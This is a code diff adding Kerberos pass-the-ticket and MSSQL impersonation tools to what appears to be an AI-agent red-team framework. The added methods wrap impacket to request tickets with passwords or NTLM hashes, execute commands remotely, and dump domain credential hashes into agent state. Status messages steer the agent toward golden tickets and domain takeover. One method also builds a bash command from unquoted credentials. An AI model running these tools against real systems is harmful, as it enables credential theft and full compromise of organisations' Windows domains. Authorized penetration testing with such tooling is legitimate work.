@@ -3,15 +3,18 @@
 This module provides toolsets for:
 - WinRM (evil-winrm)
 - PsExec, WMIExec, SMBExec
+- Kerberos pass-the-ticket attacks
 - MSSQL attacks
 """
 
 import logging
+import re
 from typing import ClassVar
 
 import dreadnode as dn
 from dreadnode.agent.tools.base import Toolset
 
+from ares.core.models import Hash, SharedRedTeamState
 from ares.tools.red.common import (
     PLACEHOLDER_PASSWORDS,
     AnyRedTeamState,
@@ -295,6 +298,449 @@ class LateralMovementTools(Toolset):
         except Exception as e:
             return f"SMBExec failed: {e}"
 
+    # Kerberos pass-the-ticket methods
+
+    @dn.tool_method
+    def get_tgt(
+        self,
+        username: str,
+        domain: str,
+        password: str | None = None,
+        hash: str | None = None,
+        dc_ip: str | None = None,
+    ) -> str:
+        """
+        Request Kerberos TGT for pass-the-ticket attacks.
+
+        Generates a .ccache file that can be used for Kerberos authentication
+        with other tools using KRB5CCNAME environment variable.
+
+        Args:
+            username: Username to request TGT for
+            domain: Domain name (e.g., 'domain.local')
+            password: Password for authentication (optional if using hash)
+            hash: NTLM hash for authentication (optional if using password)
+            dc_ip: Domain controller IP address (optional)
+
+        Returns:
+            Path to .ccache file or error message
+
+        Example:
+            >>> get_tgt("admin", "domain.local", password="pass")  # pragma: allowlist secret
+            >>> get_tgt("admin", "domain.local", hash="aad3b435...")
+        """
+        if not (password or hash):
+            return "[!] Error: Either password or hash must be provided"
+
+        resolved_password = self._resolve_password(username, domain, password)
+        if (
+            hash
+            and resolved_password
+            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
+        ):
+            resolved_password = None
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        # Build target string
+        if resolved_password:
+            target_string = f"{domain}/{username}:{resolved_password}"
+        else:
+            target_string = f"{domain}/{username}"
+
+        cmd = ["impacket-getTGT", target_string]
+
+        if hash and not resolved_password:
+            cmd.extend(["-hashes", f":{hash}"])
+
+        if dc_ip:
+            cmd.extend(["-dc-ip", dc_ip])
+
+        try:
+            logger.info(f"[*] Requesting TGT for {domain}\\{username}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)
+
+            output = stdout + "\n" + (stderr or "")
+
+            # Extract ccache file path from output
+            ccache_match = re.search(r"Saving ticket in ([^\s]+\.ccache)", output)
+            if ccache_match:
+                ccache_path = ccache_match.group(1)
+                logger.info(f"[+] TGT saved to {ccache_path}")
+                return (
+                    f"✅ TGT obtained successfully!\n"
+                    f"→ Ticket saved to: {ccache_path}\n"
+                    f"→ Use with: export KRB5CCNAME={ccache_path}\n"
+                    f"→ Or use psexec_kerberos/wmiexec_kerberos/secretsdump_kerberos\n\n" + output
+                )
+
+            if returncode == 0:
+                return f"[+] getTGT completed\n{output}"
+
+            return output
+
+        except Exception as e:
+            return f"getTGT failed: {e}"
+
+    @dn.tool_method
+    def psexec_kerberos(
+        self,
+        target: str,
+        username: str,
+        domain: str,
+        ticket_path: str | None = None,
+        command: str = "cmd.exe /c whoami && hostname",
+        dc_ip: str | None = None,
+        target_ip: str | None = None,
+    ) -> str:
+        """
+        Execute command via PsExec using Kerberos ticket (pass-the-ticket).
+
+        Uses a .ccache ticket file for authentication instead of password/hash.
+        IMPORTANT: Kerberos requires FQDN hostname, not IP address.
+
+        Args:
+            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            username: Username the ticket was issued for
+            domain: Domain name (e.g., 'domain.local')
+            ticket_path: Path to .ccache ticket file (default: {username}.ccache)
+            command: Command to execute (default: whoami && hostname)
+            dc_ip: Domain controller IP for Kerberos (optional)
+            target_ip: Target IP address to connect to (overrides DNS resolution)
+
+        Returns:
+            Command output or error message
+
+        Example:
+            >>> psexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
+            >>> psexec_kerberos("dc01.domain.local", "admin", "domain.local", ticket_path="admin.ccache")
+        """
+        # Validate target is FQDN (Kerberos requires hostname, not IP)
+        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
+            return (
+                "[!] Error: Kerberos requires hostname (FQDN), not IP address.\n"
+                f"→ Use the hostname instead, e.g., 'dc01.{domain}' instead of '{target}'"
+            )
+
+        actual_ticket = ticket_path or f"{username}.ccache"
+        target_string = f"{domain}/{username}@{target}"
+
+        cmd = ["impacket-psexec", "-k", "-no-pass", target_string]
+        if dc_ip:
+            cmd.extend(["-dc-ip", dc_ip])
+        if target_ip:
+            cmd.extend(["-target-ip", target_ip])
+        cmd.extend(["-c", command])
+
+        # Prepend KRB5CCNAME environment variable
+        cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd
+
+        try:
+            logger.info(f"[*] Executing via Kerberos PsExec on {target}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
+
+            output = stdout + "\n" + (stderr or "")
+
+            if returncode == 0 or username.lower() in output.lower():
+                logger.info(f"[+] Kerberos PsExec to {target} successful!")
+
+            return output
+
+        except Exception as e:
+            return f"Kerberos PsExec failed: {e}"
+
+    @dn.tool_method
+    def wmiexec_kerberos(
+        self,
+        target: str,
+        username: str,
+        domain: str,
+        ticket_path: str | None = None,
+        command: str = "whoami",
+        dc_ip: str | None = None,
+        target_ip: str | None = None,
+    ) -> str:
+        """
+        Execute command via WMI using Kerberos ticket (pass-the-ticket).
+
+        Uses a .ccache ticket file for authentication. More stealthy than PsExec.
+        IMPORTANT: Kerberos requires FQDN hostname, not IP address.
+
+        Args:
+            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            username: Username the ticket was issued for
+            domain: Domain name (e.g., 'domain.local')
+            ticket_path: Path to .ccache ticket file (default: {username}.ccache)
+            command: Command to execute (default: whoami)
+            dc_ip: Domain controller IP for Kerberos (optional)
+            target_ip: Target IP address to connect to (overrides DNS resolution)
+
+        Returns:
+            Command output or error message
+
+        Example:
+            >>> wmiexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
+        """
+        # Validate target is FQDN (Kerberos requires hostname, not IP)
+        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
+            return (
+                "[!] Error: Kerberos requires hostname (FQDN), not IP address.\n"
+                f"→ Use the hostname instead, e.g., 'dc01.{domain}' instead of '{target}'"
+            )
+
+        actual_ticket = ticket_path or f"{username}.ccache"
+        target_string = f"{domain}/{username}@{target}"
+
+        cmd = ["impacket-wmiexec", "-k", "-no-pass", target_string]
+        if dc_ip:
+            cmd.extend(["-dc-ip", dc_ip])
+        if target_ip:
+            cmd.extend(["-target-ip", target_ip])
+        cmd.append(command)
+
+        # Prepend KRB5CCNAME environment variable
+        cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd
+
+        try:
+            logger.info(f"[*] Executing via Kerberos WMIExec on {target}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
+
+            output = stdout + "\n" + (stderr or "")
+
+            if returncode == 0:
+                logger.info(f"[+] Kerberos WMIExec to {target} successful!")
+
+            return output
+
+        except Exception as e:
+            return f"Kerberos WMIExec failed: {e}"
+
+    @dn.tool_method
+    def smbexec_kerberos(
+        self,
+        target: str,
+        username: str,
+        domain: str,
+        ticket_path: str | None = None,
+        command: str = "whoami",
+        dc_ip: str | None = None,
+    ) -> str:
+        """
+        Execute command via SMB using Kerberos ticket (pass-the-ticket).
+
+        Uses a .ccache ticket file for authentication.
+        IMPORTANT: Kerberos requires FQDN hostname, not IP address.
+
+        Args:
+            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            username: Username the ticket was issued for
+            domain: Domain name (e.g., 'domain.local')
+            ticket_path: Path to .ccache ticket file (default: {username}.ccache)
+            command: Command to execute (default: whoami)
+            dc_ip: Domain controller IP for Kerberos (optional)
+
+        Returns:
+            Command output or error message
+
+        Example:
+            >>> smbexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
+        """
+        # Validate target is FQDN (Kerberos requires hostname, not IP)
+        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
+            return (
+                "[!] Error: Kerberos requires hostname (FQDN), not IP address.\n"
+                f"→ Use the hostname instead, e.g., 'dc01.{domain}' instead of '{target}'"
+            )
+
+        actual_ticket = ticket_path or f"{username}.ccache"
+        target_string = f"{domain}/{username}@{target}"
+
+        cmd = ["impacket-smbexec", "-k", "-no-pass", target_string]
+        if dc_ip:
+            cmd.extend(["-dc-ip", dc_ip])
+        cmd.append(command)
+
+        # Prepend KRB5CCNAME environment variable
+        cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd
+
+        try:
+            logger.info(f"[*] Executing via Kerberos SMBExec on {target}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
+
+            output = stdout + "\n" + (stderr or "")
+
+            if returncode == 0:
+                logger.info(f"[+] Kerberos SMBExec to {target} successful!")
+
+            return output
+
+        except Exception as e:
+            return f"Kerberos SMBExec failed: {e}"
+
+    @dn.tool_method
+    def secretsdump_kerberos(
+        self,
+        target: str,
+        username: str,
+        domain: str,
+        ticket_path: str | None = None,
+        dc_ip: str | None = None,
+        target_ip: str | None = None,
+        timeout_minutes: int = 5,
+    ) -> str:
+        """
+        Dump secrets using Kerberos ticket authentication (pass-the-ticket).
+
+        Uses a .ccache ticket file (e.g., from S4U attack) to authenticate
+        and dump SAM database, cached credentials, and LSA secrets.
+        IMPORTANT: Kerberos requires FQDN hostname, not IP address.
+
+        Args:
+            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            username: Username the ticket was issued for (e.g., 'Administrator')
+            domain: Domain name (e.g., 'domain.local')
+            ticket_path: Path to .ccache ticket file (default: {username}.ccache)
+            dc_ip: Domain controller IP for Kerberos (optional)
+            target_ip: Target IP address to connect to (overrides DNS resolution)
+            timeout_minutes: Maximum time for dumping (default: 5)
+
+        Returns:
+            Extracted credentials including NTLM hashes, Kerberos keys, and secrets
+
+        Example:
+            >>> secretsdump_kerberos("dc01.domain.local", "Administrator", "domain.local")
+            >>> secretsdump_kerberos("dc01.domain.local", "Administrator", "domain.local", ticket_path="Administrator.ccache")
+        """
+        # Validate target is FQDN (Kerberos requires hostname, not IP)
+        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
+            return (
+                "[!] Error: Kerberos requires hostname (FQDN), not IP address.\n"
+                f"→ Use the hostname instead, e.g., 'dc01.{domain}' instead of '{target}'"
+            )
+
+        actual_ticket = ticket_path or f"{username}.ccache"
+        target_string = f"{domain}/{username}@{target}"
+
+        cmd = ["impacket-secretsdump", "-k", "-no-pass", target_string]
+        if dc_ip:
+            cmd.extend(["-dc-ip", dc_ip])
+        if target_ip:
+            cmd.extend(["-target-ip", target_ip])
+
+        # Prepend KRB5CCNAME environment variable
+        cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd
+
+        try:
+            logger.info(f"[*] Running Kerberos secretsdump on {target}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=timeout_minutes * 60)
+
+            output = stdout + "\n" + (stderr or "")
+
+            # Check for high-value hashes
+            has_krbtgt = "krbtgt:" in output.lower()
+            has_administrator = "administrator:" in output.lower() and ":::" in output
+
+            if has_krbtgt:
+                output = (
+                    "🚨 KRBTGT HASH EXTRACTED - GOLDEN TICKET POSSIBLE!\n"
+                    "→ Use generate_golden_ticket to forge tickets\n"
+                    "→ This grants PERSISTENT domain admin access\n\n" + output
+                )
+            elif has_administrator:
+                output = (
+                    "🚨 ADMINISTRATOR HASH EXTRACTED - DOMAIN ADMIN ACHIEVED!\n"
+                    "→ Domain admin access confirmed\n"
+                    "→ Run secretsdump on all remaining DCs\n\n" + output
+                )
+
+            if returncode == 0:
+                logger.info(f"[+] Kerberos secretsdump on {target} successful!")
+
+            # Auto-extract NTLM hashes into state for real-time propagation
+            if self.state:
+                self._extract_ntlm_hashes_to_state(output, domain)
+
+            return output
+
+        except Exception as e:
+            return f"Kerberos secretsdump failed: {e}"
+
+    def _extract_ntlm_hashes_to_state(  # noqa: PLR0912
+        self, output: str, domain: str
+    ) -> None:
+        """Extract NTLM hashes from secretsdump output and add to state immediately.
+
+        This triggers real-time Redis checkpoint so the orchestrator sees hashes
+        without waiting for task completion.
+        """
+        if not output:
+            return
+
+        extracted = 0
+        guest_null_hash = "31d6cfe0d16ae931b73c59d7e0c089c0"  # pragma: allowlist secret
+        for line in output.splitlines():
+            stripped = line.strip()
+            if not stripped or stripped.startswith(("[", "#")):
+                continue
+
+            # Match domain-prefixed: DOMAIN\user:rid:lmhash:nthash:::
+            m = re.match(
+                r"([^\\:\s]+)\\([^:\\]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::",
+                stripped,
+            )
+            if m:
+                h_domain, h_user = m.group(1), m.group(2)
+                lm_hash, nt_hash = m.group(4), m.group(5)
+            else:
+                # Match non-prefixed: user:rid:lmhash:nthash:::
+                m = re.match(
+                    r"([^:\\$\s]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::",
+                    stripped,
+                )
+                if m:
+                    h_user = m.group(1)
+                    h_domain = domain
+                    lm_hash, nt_hash = m.group(3), m.group(4)
+                else:
+                    continue
+
+            # Skip Guest with null NT hash, and machine accounts
+            if nt_hash == guest_null_hash and h_user.lower() == "guest":
+                continue
+            if h_user.endswith("$"):
+                continue
+
+            hash_obj = Hash(
+                username=h_user,
+                hash_value=f"{lm_hash}:{nt_hash}",
+                hash_type="NTLM",
+                domain=h_domain,
+                source="secretsdump",
+            )
+
+            if isinstance(self.state, SharedRedTeamState):
+                if self.state.add_hash(hash_obj, "secretsdump"):
+                    extracted += 1
+            elif self.state is not None:
+                self.state.hashes.append(hash_obj)
+                extracted += 1
+
+        if extracted:
+            logger.warning(
+                f"[+] Auto-extracted {extracted} NTLM hashes from secretsdump into state"
+            )
+            # Record NTDS dump as a weakness
+            if isinstance(self.state, SharedRedTeamState):
+                self.state.add_weakness(
+                    f"### Full NTDS.DIT dump — {extracted} NTLM hashes extracted\n"
+                    f"**Vulnerability:** Secretsdump successfully dumped {extracted} "
+                    f"NTLM hashes from a domain controller, exposing all domain credentials.\n"
+                    f"- **Affected Resource:** {domain} domain controller\n"
+                    f"- **Discovery Method:** secretsdump (Kerberos auth via S4U/pass-the-ticket)\n"
+                    f"- **Impact:** All domain user password hashes compromised. "
+                    f"Enables pass-the-hash, golden ticket, and complete domain takeover."
+                )
+
 
 class MSSQLTools(Toolset):
     """Tools for MSSQL exploitation and privilege escalation.
@@ -420,6 +866,79 @@ RECONFIGURE;
             return f"xp_cmdshell enable failed: {e}"
 
     @dn.tool_method
+    def mssql_enum_impersonation(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+    ) -> str:
+        """
+        Enumerate MSSQL users that can be impersonated for privilege escalation.
+
+        Discovers accounts with IMPERSONATE permission granted, which can be
+        used with mssql_impersonate to escalate privileges. Run this BEFORE
+        attempting impersonation to know which users are valid targets.
+
+        Args:
+            target: MSSQL server IP
+            username: Username for authentication
+            password: Password for authentication
+            domain: Domain for Windows auth (optional)
+            windows_auth: Use Windows authentication
+
+        Returns:
+            List of users that can be impersonated
+
+        Example:
+            >>> mssql_enum_impersonation("192.168.56.22", "user", "pass", "domain.local")
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        # nosec B608 - intentional SQL for MSSQL pentest recon
+        sql_query = """
+SELECT DISTINCT b.name AS 'ImpersonatableUser'
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+"""
+        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
+        if windows_auth:
+            cmd_string += " -windows-auth"
+
+        try:
+            logger.info(f"[*] Enumerating impersonation rights on {target}")
+            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Check if we found impersonatable users
+            if "impersonatableuser" in result.lower() and (
+                "sa" in result.lower() or "admin" in result.lower() or "dbo" in result.lower()
+            ):
+                logger.warning("[!] High-value impersonation targets found!")
+                result = (
+                    "🚨 IMPERSONATION TARGETS FOUND!\n"
+                    "\u2192 Use mssql_impersonate to execute queries as these users\n"
+                    "\u2192 Target 'sa' or admin accounts for sysadmin access\n\n" + result
+                )
+            elif "impersonatableuser" in result.lower():
+                logger.info("[+] Impersonation rights enumerated")
+                result = (
+                    "📋 IMPERSONATION RIGHTS FOUND\n"
+                    "\u2192 Use mssql_impersonate with discovered users\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Impersonation enumeration failed: {e}"
+
+    @dn.tool_method
     def mssql_impersonate(
         self,
         target: str,
@@ -437,11 +956,13 @@ RECONFIGURE;
         MSSQL allows impersonation if EXECUTE AS permissions are granted.
         Use to escalate from low-privileged SQL login to sysadmin.
 
+        Run mssql_enum_impersonation FIRST to discover valid impersonation targets.
+
         Args:
             target: MSSQL server IP
             username: Current username
             password: Password for authentication
-            impersonate_user: User to impersonate (e.g., 'sa', 'dbo')
+            impersonate_user: User to impersonate (e.g., 'sa', 'dbo') - get from mssql_enum_impersonation
             query: SQL query to execute as impersonated user
             domain: Domain for Windows auth (optional)
             windows_auth: Use Windows authentication
@@ -451,6 +972,7 @@ RECONFIGURE;
             Query result executed as the impersonated user
 
         Example:
+            >>> mssql_enum_impersonation("192.168.56.22", "user", "pass", "domain.local")  # First enumerate
             >>> mssql_impersonate("192.168.56.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "domain.local")
         """
         if domain:
